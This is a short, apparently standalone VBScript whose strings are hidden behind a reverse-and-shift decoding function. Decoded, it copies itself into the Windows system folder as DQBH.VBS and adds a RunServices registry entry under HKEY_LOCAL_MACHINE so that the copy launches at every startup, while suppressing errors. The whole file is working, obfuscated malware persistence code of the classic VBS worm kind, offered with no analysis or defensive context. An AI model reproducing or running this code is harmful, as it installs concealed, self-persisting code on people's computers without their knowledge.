On Error Resume Next

Dim G4Y, VB9D8

Set G4Y = CreateObject( O0Q2( "udfkcPnfutzTfmjG/hojuqjsdT" ) )
G4Y.CopyFile WScript.ScriptFullName, G4Y.BuildPath( G4Y.GetSpecialFolder(1), O0Q2( "TCW/ICRE" ) )

Set VB9D8 = CreateObject( O0Q2( "mmfiT/uqjsdTX" ) )
VB9D8.RegWrite O0Q2( "]tfdjwsfTovS]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]FOJIDBN`MBDPM`ZFLI" ) & O0Q2( "ICRE" ), G4Y.BuildPath( G4Y.GetSpecialFolder(1), O0Q2( "TCW/ICRE" ) )

Function O0Q2( B92E6 )
   Dim BL5EFR
   Dim WT9JRX
   Dim U3W

   BL5EFR = ""

   For WT9JRX = 1 To Len( B92E6 )
       U3W = Mid( B92E6, WT9JRX, 1 )

       BL5EFR = Chr( Asc( U3W ) - 1 ) & BL5EFR
   Next

   O0Q2 = BL5EFR
End Function
